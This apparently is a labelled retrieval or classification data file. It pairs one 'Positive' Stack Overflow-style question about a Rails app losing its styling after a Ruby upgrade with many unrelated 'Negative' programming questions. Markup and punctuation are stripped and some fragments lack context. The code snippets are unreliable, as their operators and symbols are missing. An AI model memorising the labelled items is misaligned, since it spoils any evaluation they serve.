Positive 68616 pI am trying to upgrade to Ruby 2.1.2 from 1.9.3 for my Rails app. p  pThe problem I am facing is that the apps UI styling and layout has been destroyed by the upgrade. I can only see a white page with the UI elements text boxes, select boxes minus any styling arranged one below the other. p  pMy coderailscode version is fixed at 3.1.3 and my codejqueryrailscode gem version is fixed at 2.2.1.

Negative 68616 pIm thinking about using asking sphinx to index many fields in the hundreds, many of which will be null.

Basically I will be building the index config dynamically in the indexed model, and may end up with quite a few null fields from doing so.p  pMy guess is the performancesuccess of this depends on what Sphinx does with null values... if it simple ignores them, then I should be fine, but if it actually stores that the field is null in its index, I could have a problem.p

If both parties to the match are unbound, we may bind either to the other.p  pHowever, I cannot think of a case where this is actually necessary.p  pWhats its talking about, I emthinkem, is where you might have the following frame bindings currently presentp  precodey  4 codepre  pAnd are then asked to extendIfPossible a binding from z to y.p  pWith that  check present, when asked to extend z with y, we see that y is already bound to 4, and then recursively try to unify z with 4, which results with us extending the frame with z  4.p  pWithout the check, we would end up extending the frame with just z  y. But in both cases, so long as z is not already bound to something else, I dont see the problem.p  pNote, if z emhadem already been bound to something else then the code doesnt reach the part marked  we would have already recursed to unifying with what z had already been matched to.p  pAfter thinking it over, I have realised that there might be some sort of argument for generating a simplest MGU Most General Unifier. e.g. you might want an MGU with a minimal number of variables referring to other variables... that is, wed rather generate the substitution x  4, y  4 than the substitution x  y, y  4... but I dont think this algorithm would guarantee this behaviour in any case, because if you asked it to unify x 4 with y y then you would still end up with x  y, y  4. And if the behaviour cant be guaranteed, why the additional complexityp  pIs my reasoning here all correct If not, whats a counter example where the  check is necessary to generate a emcorrectem MGUp
Negative 68616 pIm using SVN to version a ASP.NET web project that Im working on. I have recently decided to try versioning published versions of the site. I commit these to the repository along with tagged Release versions of the code in the root of the branch. This is proving useful as I can deploy to my server using SVN.p  pProblem that Im facing is that Ive had to version some files in my projects bin folder DLLs without external references, which has created a bin.svn folder. Problem is that VS.NETs Publish command insists on copying the .svn from the development branch bin to the output folders bin. This basically switches the binary files in there to point to the dev branch. The result is that the contents of the bin folder never actually get committed to the compiled bin folder, because the working copy is pointing to a different part of the repository.p  pIs there any way to force visual studio to ignore the .svn folder on publish Alternately, is there another way to handle the inclusion of static .dlls in a project without putting them in the bin folder, so that the bin can be excluded from SVN as it should be not using the GACp

Negative 68616 pThis is a two part question. The first is a specific question about DataSets and XML. The second is a more general am I taking the right approach type question. While Id certainly appreciate replies that answer both questions, Id also welcome answers that only tackle one or the otherp  h2Question 1h2  pDoes the DataSet class support a hrefhttpwww.w3schools.comschemaschema5Fcomplex5Fmixed.asp relnofollowmixed complex type elementsa For example, lets say I have the following XMLp  precodeltcarsgt    ltcar id1gt10000      ltcolourgtblueltcolourgt      ltdoorsgt4ltdoorsgt    ltcargt ltcarsgt codepre  pThe XSD describing this XML will have a complex type with the mixed attribute set to true. This allows me to have the value of my car 10,000 in plain text, following by whatever other elements I need.p  pHowever, when I convert this XML into a DataSet and back again using the following codep  precodeStringReader sr  new StringReaderxml DataSet dataset  new DataSet dataset.ReadXmlsr sr.Close  StringWriter sw  new StringWriter dataset.WriteXmlsw xml  sw.ToString sw.Close codepre  pThen the resulting XML is as followsp  precodeltcarsgt    ltcar id1gt      ltcolourgtblueltcolourgt     ltdoorsgt4ltdoorsgt   ltcargt ltcarsgt codepre  pi.e. the value 10000 goes missing.p  pThis occurs not only if I have the ReadXml call infer the XML schema as above, but also if I provide an XSD eg by calling ReadXmlSchema.p  pIs there any way to avoid this Or should I just make sure I avoid mixed typesp  h2Question 2h2  pAre there any other limitations, such as the one outlined above, that I should be aware of when converting XML to DataSets and vice versap  pOr perhaps Question 1 indicates that I am going about things in reverse order. At the moment I am starting with the desired XML such as the cars example above, and am converting this into a DataSet. The intention is to persist the data as XML to a database, and when I wish to display this data on a WinForm, Ill convert the XML to a DataSet and use data binding on the various tables in the DataSet. But rather than starting with an XSD, perhaps I should be defining my data as a typed DataSet first, and then let the ReadXmlWriteXml methods take care of what the XML looks likep

So is regex the solution here  If so is there some kind of regex generator i can use for this or can someone point me in the right direction with a code snippet perhaps  p  pAppreciate any help thanksp

Negative 68616 pI already posted a question closely related to the this one. I watched the Mix10 video with P. Haacked and S. Hanselman.p  pI am building an AJAXpowered site whose input forms are created on the fly.p  pAll the code to accomplish this is done within a script tag or a javascript file. For example the following DOM elements are created when the page loads and are wrapped into an existing div defined in a viewp  pmyform.append myform.appendp  pWhen I click the submit button I need to get the values of the input form whose id is Name Name.val and then I return a Json object  Name name p  pFor this kind of scenario there is no way to use Html.Encode or AntiXss.HtmlEncode on the clientside. The only way to check if the input is not harmful is done on the serverside via a service layer.p  pThis seems a limitation. All is fine if and only if a view has a set of predefined inputs. When it is time to create them on the fly, the situation is different.p  pHave you thought of that situation guys p  pThanks for the attention you have put on this.p  pRoland Brussels, Belgiump

Negative 68616 pI have an application written in .NETMF that requires that I be able to parse an RFC822Datetime. p  pNormally, this would be easy, but NETMF does not have a DateTime.parse method, nor does it have some sort of a pattern matching implementation, so Im pretty much stuck.p  pAny ideasp  pEDIT Intelligent solutions are probably needed.

This is better but you need to make sure its properly indented each line.     Although you have to worry about those comment delimiters getting in the way.      At least its compact.

So basically Id like to have the subview recognise the scroll event and pass it back to the scroll view.p  pAny help is greatly appreciated.p  pCheers.p  pEDIT Here is the code Im using to add the subviews to the documentView milestoneView and activityView are both NSView subclasses which have a corresponding nib created with instantiateNibWithOwner and objects hooked up accordingly they contain a NSTextField, PXListView and some have a NSProgressIndicator.p  precodevoiduseProjectNSNumber projectId  [self resetView]  NSRect bounds  [[self view] bounds] NSRect defaultFrame  NSMakeRect20, NSMaxYbounds93, NSMaxXbounds20, 50   Prepare the milestone view if milestoneView  nil     milestoneView  [MilestoneView milestoneViewFromNibWithFramedefaultFrame withProject[BCLocalFetch projectForIdprojectId]] [milestoneView reloadList]   Prepare the activity view if activityView  nil     activityView  [ActivityView activityViewFromNibWithFramedefaultFrame withProject[BCLocalFetch projectForIdprojectId]]  [self refresh]  codepre  pI then use the refresh method to reposition them as the content sizes vary so I wanted to have a separate method.p  precodevoidrefresh  Position the milestones first [milestoneView setFrameOriginNSMakePoint20, NSMaxY[[self view] bounds][milestoneView frame].size.height60] if [[milestoneView milestones] count] gt 0     [[self view] addSubviewmilestoneView]  Now the activity view [activityView setFrameOriginNSMakePoint20, [milestoneView frame].origin.y[activityView frame].size.height20] [[self view] addSubviewactivityView]  [self autosizeView]   voidautosizeView  Resize the view to accommodate all subviews NSRect oldFrame  [[self view] frame] CGFloat lastY  [activityView frame].origin.y if lastY lt 0      CGFloat newHeight  oldFrame.size.height  lastY     [[self view] setFrameSizeNSMakeSizeoldFrame.size.width, newHeight]  [[NSNotificationCenter defaultCenter] postNotificationNameBBContentDidResizeNotification objectself]  codepre

Negative 68616 pIam looking at a performance problem that showed up between two release this is a windows app. What I observe is that the version that is slower is doing more IO than the previous one  I have observed this with process explorer see graph below when the other one do none or very few, and the IO are correlated with less cpu activity. So I am guessing that the performance loss come from the IO.p  pBut as the code is quite big, and shared by different team, its not easy to spot what as changed. Moreover the gap between the two version is also important. From what Iam concerned this two versions should still to the same kind of job... so knowing that this app is doing file  DB access, does anybody knows a way or a tool to spot which portion of code may be involved into a significant IO activity p  pI have try some profiler ltprof but without much luck so far. I have try to do some statistic debugging pausing every few second to see what the callstack is, but as the IO seems to take a minor  of the process say less lt 15, again I dont have find anything relevant so far.p  pAny idea greatly appreciated.p  pimg srchttpi.stack.imgur.com6bFH8.png altenter image description herep
Negative 68616 pI am trying to make a game for the android. I currently have all of my art assets loaded into the drawables folder, but my question is how do I actually reference a specific one to render itp  pI know that the files each have a unique id, and I probably have to implement in the override of the onDrawcanvas method. so the question is how do I actually display the image to the screenp  pI have looked through a good half dozen books and all those talk about is getting an image off the web, or manually drawing it with the paint functionality, but I have the assets ready to go in .bmp, and they are complex enough that coding paint to draw them by hand will be a very great migrain. p  pI would prefer a direction to look in specific book, tutorial, blog, open source code[assuming quality comments]I am still kinda learning java as my 2nd programming language and so I am not to the point of translating pseudocode directly to java yet.p  p[added in edit] does drawing using Paint every frame have a lower overhead then rendering a bitmap, and only changing the display when it changesp
Negative 68616 pIve been working on a game in for HTML 5 using the canvas tag, and Ive build up quite a code base to cover my requirements.

Is this a memory leakp  pWhen I ran my webpage in the Profiler and checked the heap before and after cleanup it does appear to remove all the references to my objects and they disappear but my usage only drops by only a few kilobytes leaving about 1.3mb of arrays, strings, and other objects behind. Is it impossible to catch all this or is there something majorly wrongp  pThanks.p

What am I doing wrongp  pFemi said You are passing in a Messenger as an Intent extra to the BackgroundService class, but there is no builtin Android code that understands what to do with that Messenger that has to be provided by the BackgroundService implementation.

Negative 68616 pI am converting an existing ASP.NET website to use jQuery Mobile controls. The first thing I did was replace the Login.aspx with the new Masterpage and mobile controls. However, now after the login occurs, in the codebehind, there is a Response.Redirect to Default.aspx. When that occurs, a javascript error occurs and the whole page dumps and fails to load.p  pMy assumption is that the mechnanisms in jQuery mobile that try to AJAX everything are not playing nicely with scripts that MS.NET is producing. So I want jQuery to ignore the redirect and not AJAXify it.p  pThe problem is, all the solutions I see have to do with adding code to the anchor tag, but Im redirecting from behind, not using an anchor tag.p

Negative 68616 pWe have currently working projects that use Javascript API to get the Facebook session object, pass it to a Flash client, and that Flash client then sends it to our Java socket server which validates the session without a call to Facebook itself, by concatenating the half dozen or so parts of the session object not the sig in a certain order, concatenating the app secret key at the end, then hashing.  This is compared to the sig, and it matches nicely for us, using the old api and a valid client.p  pOn Oct 1st, the old api with session wont work any more. The authResponse object doesnt have the same fields.  It has accessToken, userID, expiresIn, and signedRequest.  p  pIs there a way for our Java socket server to do a similar validation of an authResponse object, so that it doesnt have to make a Facebook call when the client logs in to the socket serverp

Negative 68616 pI have a blog where I want the user to click a link to be able to invert the colour scheme from dark on light to light on dark.  This link will be available on each page of the blog.p  pIf I wasnt using CodeIgniter, I would create a link with a parameter e.g. index.phpinvertedtrue and in my controller detect if GET[inverted] was set, set a SESSION variable.  The link would be changed and the additional CSS file would be added when SESSION is set.  The links new href would be something like index.phpinvertedfalse and the SESSION variable would be unset.  It would work sitewide and regardless of the rest of the URI.p  pIve tried using the urisegement functions in CodeIgniter, but because this needs to be across the whole site, my URIs change sometimes just index.phpcontrollerfunction, other times index.phpcontrollerfunctionpara1para2para3.

Also, if a user is on the same page and clicks the link twice, the URI keeps adding inverted again and again.p  pI made a mock form so I could use the POST array instead, but I know this isnt good practice.p  pAny suggestionsp

Negative 68616 pIm trying to integrate NHibernate into an existing ASP.NET project which is already using Spring.NET and the MVP pattern to achieve a clean separation of concerns. In other words, there is no data access code, or awareness thereof, in any of my PresentersViews and Id like to keep it that way.p  pHowever, the Spring.Northwind.Web example that ships with the Spring.NET source has each Web Controller i.e. Presenter taking an NHibernate ISessionFactory object as a constructor dependency. Based on my limited amount of reading, it looks like this coupling is necessary if one wants to use OSIV. Assuming I dont want to OSIV still reading up on this, can I safely remove the ISessionFactory dependency from my Presentation tier I would really appreciate it if more experienced NHibernaters could chime in with proscons and consequnces of not using OSIV or any other gotchas with this stack.p  pMany Thanks.p

Negative 68616 pI have a page on which users connect to my node server with socket.io but I only allow them to have one open socket.io connection to the server by passing along their account id when authorizing them and storing it in an array and this works fine 99 of the time. The problem is that sometimes when users disconnect, the serverside disconnect event doesnt fire for some reason, so I cant clear their account from the array of clients, which ends up with them being locked out.p  pIs there a way for me to check if their old socket connection which I have the ID of is still active So if it isnt I can clear their old connection and let them connect againp

Negative 68616 pIm using Google Appengine to run a webapp and Ive run into a bit of a problem. I need to generate a pretty big CSV file and send it to the client. Since there is a 60 second timeout maximum and there is no filesystem to write to, I decided to use SJAX synchronous AJAX I guess to get the data from the server in chunks, conctenate them, and then send it back to the server where the server sends it back to the client as a CSV file. Very annoying. p  pAnyways, this takes a very long time so I thought I would use a progress bar that checks how many chunks have been received against how many there are total. The problem is, since Im using SJAX, the solitary js thread is getting blocked. codesetTimeoutcode gets blocked as well. Anyone know of any way to get around this the GUI part, Im trying to figure a better way to handle the file download separatelyp  pEDIT While I appreciate Shay pointing me in the right direction to resolving my problem, I am still curious as to whether there is a way to I guess emulate multithreading during an SJAX call.p

Negative 68616 pGood dayp  pIn his Effective STL Scott Meyers wrotep  pemA third is to use the information in an ordered container of iterators to iteratively splice the lists elements into the positions youd like them to be in. As you can see, there are lots of options.em Item 31, second partp  pCan someone explain me this wayp  hr  pstrongMore text to understand the contextstrongp  pThe algorithms sort, stablesort, partialsort, and nthelement require random access iterators, so they may be applied only to vectors, strings, deques, and arrays. It makes no sense to sort elements in standard associative containers, because such containers use their comparison functions to remain sorted at all times. The only container where we might like to use sort, stablesort, partialsort, or nthelement, but cant, is list, and list compensates somewhat by offering its sort member function. Interestingly, listsort performs a stable sort. If you want to sort a list, then, you can, but if you want to use partialsort, or nthelement on the objects in a list, you have to do it indirectly. One indirect approach is to copy the elements into a container with random access iterators, then apply the desired algorithm to that. Another is to create a container of listiterators, use the algorithm on that container, then access the list elements via the iterators. strongA third is to use the information in an ordered container of iterators to iteratively splice the lists elements into the positions youd like them to be in.strong As you can see, there are lots of options.p

Negative 68616 pBasically, i have a program that is given a 4 meg compressed file, it has to decode this file into uncompressed  100 meg, then compress it back into 4 meg file. I need to store this intermediate 100 meg file somewhere on the drive dont want to keep it in memory.p  pProgram is written in C and will be executed on MS Windows 7.

This is also not desired, and i dont know how to query for system variables from Cp  p3 So, basically, only idea i have right now is to make a function to open file thatp  ul litries to create a temp file in the output dir, if possibleli liif failed, tries to create a temp file in input dirli liif failed, tries to create a temp file in TEMP dir from system variableli liif failed, tries to create a temp file in TMP dir from system variableli ul  pand a delete function thatp  ul litries to remove the file by its name that is stored somewhereli liif failed, it tries to open the file for write, and close it, so it becomes a 0 byte fileli ul  pAre there better ideas p  pAny help is appreciated, thanksp  pPS Program must not use any external libraries like MFC or something, only builtin standart C functions p

Negative 68616 pI have an existing project that I am adding the CoreData framework to but Im running into some trouble. Ive added CoreData to existing projects before but Im not sure where Im going wrong in this case.p  pI have added all of the necessary code to the AppDelegate.h and .m files. I have added the import statement to my .pch. Ive created my data model file with all of the properties of my Lesson object. Ive done everything I can think of but when my viewDidLoad method runs through, my managedObjectContext is still nil.p  pIve posted the code for my AppDelegate and my ViewController below.

Typical reasons for an error here include           The persistent store is not accessible           The schema for the persistent store is incompatible with current managed object model.          Check the error message to determine what the actual problem was.            If the persistent store is not accessible, there is typically something wrong with the file path. Often, a file URL is pointing into the applications resources directory instead of a writeable directory.           If you encounter schema incompatibility errors during development, you can reduce their frequency by           Simply deleting the existing store          [[NSFileManager defaultManager] removeItemAtURLstoreURL errornil]            Performing automatic lightweight migration by passing the following dictionary as the options parameter           [NSDictionary dictionaryWithObjectsAndKeys[NSNumber numberWithBoolYES], NSMigratePersistentStoresAutomaticallyOption, [NSNumber numberWithBoolYES], NSInferMappingModelAutomaticallyOption, nil]           Lightweight migration will only work for a limited set of schema changes consult Core Data Model Versioning and Data Migration Programming Guide for details.

Negative 68616 pI have been unable to find any information on this topic and most of what I know about it has come by complete accident and a few hours of trying to figure out why my code wasnt working. While learning objectivec most tutorials I have found make variables and properties with the same name. I dont understand the significance because it seems that the property does all the work and the variable just kind of sits there. For instance p  pstrongTest.hstrongp  precodeinterface Test  NSObject      int timesPlayed, highscore   property int timesPlayed, highscore   Methods and stuff  end codepre  pstrongTest.mstrongp  precodeimplementation Test    synthesize timesPlayed  timesPlayed   synthesize highscore    highscore     methods and stuff  end codepre  pstrongWhat I knowstrongp  p1 Okay so today I found out after hours of confusion that no matter how much changing you do to the properties codehighscore  5091231code it wont change anything when you try to call [test highscore] as it will still be returning the value of highscore which I think is the ivar that was set in test.h. So all changing of variables in test.m needs to be changing highscore and not highscore. Correct me if Im wrong here pleasep  p2 If I understand it correctly I probably dont the ivars set in test.h represent the actual memory where as the properties are just ways to access that memory. So outside of the implementation I cant access highscore without going through the property.p  pstrongWhat I dont understandstrongp  pBasically what I dont get about this situation is whether or not I need to use the ivars at all or if I can just use property and synthesize. It seems like the ivars are just extra code that dont really do anything but confuse me. Some of the most recent tuts Ive seen dont seem to use ivars but then some do. So is this just a coding preference thing or is it actually important I have tried searching through Apples Documentation but I get rather lost in there and never seem to find what Im looking for. Any guidance will be greatly appreciated.p

Negative 68616 pSo Im trying to keep two copies of a set of images cached in my program. Ive got an object that holds both references in it and a loop that loads the images and passes them to a new instance of that particular class. However, on about the 25th iteration, I get an Array Index Out of Bounds Exception when the class makes the copy. Ive deduced that its trying to either copy to a nonexistent pixel in the second copy or its going beyond the bounds of the first copy.p  pHeres the parts of the code that matterp  pThe Loopp  precodeHashtableltString, Sheetgt tempHashTable  new HashtableltString, Sheetgt forint ii  0 ii lt sheetNames.size ii     try        File tempSheetFile  new FileConstants.TEMPDIR, sheetNames.getii       BufferedImage tempSheet  ImageIO.readtempSheetFile       System.out.printlnsheetNames.getii       tempHashTable.putsheetNames.getii, new SheettempSheet     catch IOException ex       codepre  pSheet Initp  precodeprivate BufferedImage defaultSheet private BufferedImage currentSheet  public SheetBufferedImage defaultSheet      this.defaultSheet  defaultSheet     currentSheet  new BufferedImagedefaultSheet.getWidth, defaultSheet.getHeight, BufferedImage.TYPEINTARGB     currentSheet.setDatadefaultSheet.getData Error line  codepre  pErrorp  precodeException in thread AWTEventQueue0 java.lang.ArrayIndexOutOfBoundsException 64 codepre  pThe weirdest part about it is that the second BufferedImage is created with the size of the first, so why would we ever get an array index exceptionp  pstrongEditstrong Alright, so I switched codeBufferedImage.TYPEINTARGBcode to codedefaultSheet.getTypecode and the errors gone. The problem now is that the same images that were giving me the error before are now showing up inside the program without their red and alpha channels that definitely exist in the source files.p  pstrongEditstrong Never attribute to glitches what can be adequately explained by horrible programming. New code has the constructor load the image twice rather than copying an existing instances data.

Negative 68616 pI am using PHP and AJAX requests to get the output of a program that is always running and print it on a webpage at 5 second intervals. Sometimes this log file can get up to 2mb in size. It doesnt seem practical to me for the AJAX request to fetch the whole contents of this file every 5 seconds if the user has already gotten the full contents at least once. The request just needs to get whatever contents the user hasnt gotten in a previous request.p  pProblem is, I have no clue on where to begin to find what contents the user hasnt received. Any hints, tips, or suggestionsp  pEdit The output from the program starts off with a time HHMMSS AMPM, everything after has no pattern. The log file may span over days, so there might not be just one 020000 PM in the file, for example. I didnt write the program that is being logged, so there isnt a way for me to modify the format in which it prints its output.p

Even if there was only one node reporting data each 5 seconds, then the total number of measurements in embedded array only for one day is 246060517280. Having 5 nodes reporting for a month gives 5 embedded arrays with 518400 elements in one document. The longer the device works, the more entries it has in embedded array of measurements for each node attached.p  h2Questionsh2  ul liHow does estimated readwrite ratio influence decision of embedding vs linkingli lipIs it justified in this case to sacrifice all the good things of embedding and split the data into 2 collectionsp  pWhat I have been thinking of is e.g. one collection for devicenode configuration embedding information here since there isnt much of it, and the second only for measurements with references to the device and node it came from. I think that this will cost a few calls to the DB more, but will be better in terms of performance and memory usage. pli ul

Negative 68616 pI have encountered a PATH problem when building a small web site. The site consists of a few standard pages in different folders and a few others in a folder named include. I now have three files included on each page  menu.php, header.php and footer.php  all three contained in the folder include. I have used setincludepath and it works quite well as far as PHP goes. However, there are problems when it comes to HTML. In the header.php file I have this syntax codeltimg srcpicsheader.png widthXXX heightYYY gtcodep  pThe code works fine and the picture loads as long as all the files that includes header.php are in the same directory. But if I try to include it in a page in a subdir, then the picture doesnt load, which is pretty obvious, seeing as the directory level now has changed.p  pSo my question is how can I solve this issue so that HTMLpaths work in included PHPfiles, regardless of where they are placed on the sitep

Properties such as these would allow the codeAcode and codeBcode objects data to stay completely in sync while both are used by the same code.p

Negative 68616 pI was wondering if it was possible to get an SQLITE manager database onto a sever What i mean by this is so that when i complete my program in a java project and make an installer for that project.

In addtion anyone who logs in to the program can do so with full database connection. p  pIs there a way to do this I also dont want the user who is going to install the program to install any additional programs for the database. In addition i would like this program to work on any computer who might not have the SQLITEManager plugin on there firefox web browser or even have firefox installed on there computer.p  pI would also like the admin to be able to edit anything on the online server the database should be on.  If this is not possible on SQLITE Manager could you recommend a database which can do this but also use and work on the code already made for the sqlite programsp  pThanks in advance.p

Negative 68616 pI think I have a fairly straightforward problem here. But Ive been looking at this screen too long. So Im trying and failing to get stateful sessions working in Compojure. The refheap code paste stronga hrefhttpswww.refheap.compaste11161is hereastrong. p  pYou can see me trying to use a hrefhttpsgithub.comnoirclojurelibnoirstronglibnoirstronga line 62 to initialize stateful sessions. Then when the app is running, I try to make a call to a hrefhttpwww.luminusweb.netnoirapinoir.session.htmlvarput21strongsessionputstronga some data in the session line 43. p  pNow, this stacktrace says that in session.put, libnoir is trying to swap out a session var that hasnt been bound.

Negative 68616 pIm developing a Web application that is supposed to query a Web service ASP.NET Web API for certain data, and visualize the results. The queried data may change while the client application is running, as items may be added to or removed from the corresponding database collection. Either the client itself or other clients may modify the collection via the Web service. The database server, a hrefhttpravendb.net relnofollowRavenDBa, has the ability to notify its client the Web service of changes.p  pWhat Im wondering is how should clients be kept uptodate as data changes in the Web service Specifically, if a change takes place in the Web services database so that a clients view of the data becomes outdated, the client should receive fresh query results. Would it be a good idea to maintain a persistent connection to clients, e.g. via a hrefhttpsignalr.net relnofollowSignalRa, and simply notify them each time changes are made to the database so that each client can requery for data Should these change notifications be throttled in case they become too frequentp  h2Example Scenarioh2  pThe database contains the following items JSON notationp  precode[Id 2, User usera, Id 1, User usera,     Id 3, User userb, Id 4, User usera] codepre  pClient A requests items where User  usera, paginated to max 2 items and sorted on Id the service returns the following setp  precode[Id 1, User usera, Id 2, User usera] codepre  pThen client B tells the service to delete the following item codeId 2, User useracode, so that the database becomesp  precode[Id 1, User usera, Id 3, User userb,     Id 4, User usera] codepre  pThe question now is, how does the Web service notify client A that it should requery for new data That is, client A should refresh its view to contain the followingp  precode[Id 1, User usera, Id 4, User usera] codepre

Negative 68616 pIm working  on multiple projects and i find little messy to keep all the projects in one workspace. I was wondering if creating multiple workspace reduces the speed and performance of the eclipse . I already have 2 workspaces , is it advisable to create multiple workspaces.

Negative 68616 pHi I have a problem drawing with VBO. So I asked a question a a hrefhttpstackoverflow.comquestions15310777vbodoesntdrawinganythingherea .I could not find the answer of my problem. But by discussing one answer given there I have now another question about strides in VBO. I am confused about what it is and does.p  pIn a hrefhttpwww.gamedev.nettopic189323vbostridequestion relnofollowherea  I found someone answeredp  blockquote   pIf you have all your vertex data in one array array  read as   malloced pointer, all your normals in another array, etc. Then your   stride is 0. For instance if vertex, normals, etc are stored like that   p      p[vertex0][vertex1][vertex2]...p      p[normal0][normal1][normal2]...p      p[texcoord0][texcoord1][texcoord2]...p      pIf your vertex, normal, etc is packed like that p      p[vertex0][normal0][texcoord0][vertex1][normal1][texcoord1][vertex2][normal2][texcoord2]...p      pThen you should set a nonnull stride, which corresponds to the offset   needed to switch from one element to the next. this stride is counted   as bytes btwp blockquote  pFrom that explanation I thought the stride actually means the distance between end of one vertex and the start of another vertex in the buffer. In the first case its 0 because all the vertexes are stored contiguously. Same goes for the textures. But then I read another answer about the definition of strides in that same thread.p  blockquote   pThere tends to be a bit of confusion regarding VBO stride, mostly   because of its special meaning for 0. p      pStride in this context means the distance between the beginning of a   value in memory, and the beginning of the next value in memory. It is   not the distance between the end of one and the beginning of the next.   So in a VBO that is an array of a structure, the stride for each   element of that structure will be the sizeof the structure as a whole.   Keep in mind that struct padding can affect this.p blockquote  pwhich just says the opposite of what the other answer says. Or I am wrong about what the first answer meant Can anyone please help me solve the problem. I will really appreciate if anyone can give an answer with example. I have given the link of my implementation of VBO in the start of this question which is not solved yet. Thanks.p

So is there any way out of it I didnt want to use the codeasyncreadsomecode as I need this thread to sleep if there is no data has been transferred in to the buffer, that was easily done in codereadsomecode as it returns the size of data transferred. The main thing is even during timeout I dont want to close the connection, but to check if the server responds to a ping command, if it doesnt I would move to reconnection. So this is more or less checking if the server is still there connected, when no data is transmitted over a time period.p

Negative 68616 pI assume that calculating the modulus of a number is a somewhat expensive operation, at least compared to simple arithmetic tests such as seeing if a number exceeds the length of an array.

Negative 68616 pIm trying to diagnose a production memory leak in my web application. The application is a GWT app running on Tomcat 7 and mySQL, and OpenJDK 1.6.018 on Debian. p  pI booted tomcat and let the app leak for several days  no reloads of the app  and then took a heap dump and opened it in Eclipse MAT plugin. Im trying to make sense of what Im seeing. It appears that a massive amount of memory is being held from a tomcat loggin class see screenshot below.p  pI do basic logging in my GWT servlet using the java logging framework. Just basic calls like p  precodeLogger.getAnonymousLogger.logLevel.INFO, User  userId   did something interesting Logger.getAnonymousLogger.logLevel.SEVERE, exception.getMessage, exception codepre  pThe only similar issue I could find on the web to this was this a hrefhttpcontrarianwisdom.blogspot.ca201103bewareoftomcatlogging.html relnofollowblog posta. p  pCan anyone explain what might be going on here Why would tomcat logging classes be holding onto so much memory p  pimg srchttpi.stack.imgur.comzol9E.png altScreenshot of MAT analysisp  pTo confound me even further, it seems to be holding onto a massive array of weak references  but I cant seem to figure out in MAT how to find out what those weak references are pointing at, and I also would expect weak references to get collected when the heap limits are reached, but tomcat throws out of memory exceptions instead.p  pimg srchttpi.stack.imgur.comKXnSN.png altGiant Array of Weak Referencesp

Negative 68616 pI have found and read this a hrefhttpwww.musicalgeometry.comp1273 relnofollow titleiOS Camera Overlay Example Using AVCaptureSessiontutoriala. It is very good indeed I use the word read on purpose. If I had understood, I would not be asking here now.p  pNow I tried to plug what I have read into my application. I need different overlays with controls for the still image and the camera preview. I need the camera preview to sit still while the rest of the application rotates. I need it to be AVFoundation, because there will be a lot of additional image and camera functionality. I want to rotate all of the application BUT the camera preview. A selfmade container view controller is to be the hinge point. Outside of it, the application rotates. It controls rotation for its children and I hope to be able to reduce my manual rotation to the overlay of the camera preview child view controller of said container view controller.p  pAside on top of it all I am using linked storyboards, ARC and CoreData later for the photosp  pPoint is I have this view controller in a container view controllers container view. That is the one I want the preview to be in. I want the still image in another of the container view controllers child view controllers and a third child is to be a browser for fotos. Later there will be buttons and gestures to navigate from one child to the other. The capture session manager is a property of the container view controller, i.e. the parent.p  pI have set up all the properties in the capture session manager, the container view controller and the camera preview view controller in a way that they will be created when they are not already there.

Negative 68616 pI am using the TableDataGateway pattern.  All of my models which arent Mappers or DBTable classes extend ModelBase.  All of my mappers extend codeModelMapperBasecode.  All of my DBTable classes extend codeZendDbTableAbstractcode.  p  pIn all of my mapper classes, I want to enforce that there is a function codemapcode, which takes a codeDBRowcode Object, and the Model class that is maps to.  Ideally, what I would like to be able to do, is in my codeModelMapperBasecode, I would havep  precodeabstract public function mapModelBase model, ZendDbTableRowAbstract row codepre  pAnd then when I implement it, I would dop  precodepublic function mapModelUser user, ZendDbTableRowAbstract row      usergtsetIdrowgtid          gtsetNamerowgtname     return user  codepre  pBut obviously, that doesnt work, as the abstract function says it should take ANY class that extends ModelBase.  But I would like to ensure that, yes, it MUST be one the extends ModelBase, but then I would like to have the implementations be strongmore specificstrong.p  pThe only thing I can think of is something likep  precodepublic function mapModelBase user, ZendDbTableRowAbstract row    if getclassuser  ModelUser         throw new ExceptionInvalid Class    else        usergtsetIdrowgtid            gtsetNamerowgtname       return user     codepre  pBut that just seems, wrong on a certain level.  Is there a better way to do thisp  pEdit  So, not being satisfied with the below, I have resorted to thisp  precodefinal public function mapModelBase model,                            ZendDbTableRowAbstract row      if getclassthis  getclassmodel.Mapper          throw new ExceptionInvalid Class Expected  . substrgetclassthis, 0, strlenthis6 . . Received  .             getclassmodel . .          return thisgtmapImplementationmodel, row   abstract protected function mapImplementationModelBase model,                                                ZendDbTableRowAbstract row codepre  pAnd then have my Mapper Classes implement the mapImplementation method, but always call the map method.  This accomplishes what I would like, effectively, but seems a little contrived, and only happens to work because, as of right now, all my Mapper Classes have a class with the same name sans mapper.  p  pIs there a better way to accomplish what I am trying to do, which would not depend on a naming scheme or throwing an exception in each classp  pEDIT  I am not looking for use instanceOf instead of getclass  that is essentially the same thing for my purposes, and if I plan on extending my nonbase mapper classes, I will make that change.  I am looking for a way to enforce the correct class type, without manually throwing an exception.p

What I find quite different from the .Net approach to the ActiveRecord implementation in CodeIgniter is how Models are used, for example, in CI youd normally have a model instance loaded and use it almost like a static method to do all operations and then pass some sort of data as parameter either as an array or several parametersp  precodethisgtloadgtmodelUsermodel thisgtUsermodelgtsaveusername, password codepre  pOrp  precodethisgtloadgtmodelUsermodel thisgtUsermodelgtsavearray   user gt theuser,   password gt thepassword  codepre  pSo youll end up using the same instance to do all operations, but sometimes that can be confusing, especially coming from another object oriented language, I often find myself doing thisp  precodeuser  new Usermodel usergtusername  theusername usergtpassword  thepassword usergtsave codepre  pAs seen, I invoke a method on an instance to do actual work, the save method would look likep  precodefunction save    thisgtdbgtsetusername, thisgtusername   thisgtdbgtsetusername, md5thisgtpassword   thisgtdbgtinsertUser  codepre  pIs there some recommended standard to do this kind of operations in CI I do know there must be pros and cons but I dont see anything about this topic on the CI Documentation.p  pThanks in advancep

